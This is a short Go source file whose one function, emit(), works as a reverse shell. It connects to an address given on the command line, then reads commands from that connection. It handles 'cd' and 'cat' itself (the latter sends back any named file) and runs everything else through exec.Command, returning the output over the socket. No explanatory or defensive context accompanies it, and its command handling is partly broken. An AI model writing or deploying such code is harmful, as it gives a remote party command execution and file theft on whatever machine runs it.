package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func emit() {
	conn, err := net.Dial("tcp", os.Args[2])

	if err != nil {
		fmt.Println("Error connecting to the server")
	}

	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		data := string(buf[:n])
		if err == nil {
			words := strings.Fields(data)
			if words[0] == "cd" {
				if len(words) == 1 {
					err := os.Chdir("/")
					if err != nil {
						conn.Write([]byte("Invalid Command !\n"))
					}
				} else {
					err := os.Chdir(words[1])
					if err != nil {
						conn.Write([]byte("Invalid Command !\n"))
					}
				}
				conn.Write([]byte("Directory Changed !\n"))
			} else if words[0] == "cat" {
				file, err := os.ReadFile(words[1])
				if err != nil {
					conn.Write([]byte("Invalid Command !\n"))
				}
				conn.Write(file)
			} else {
				out, err := exec.Command(data).Output()
				if err != nil {
					conn.Write([]byte("Invalid Command !\n"))
				}
				conn.Write(out)
			}

		}
	}
}
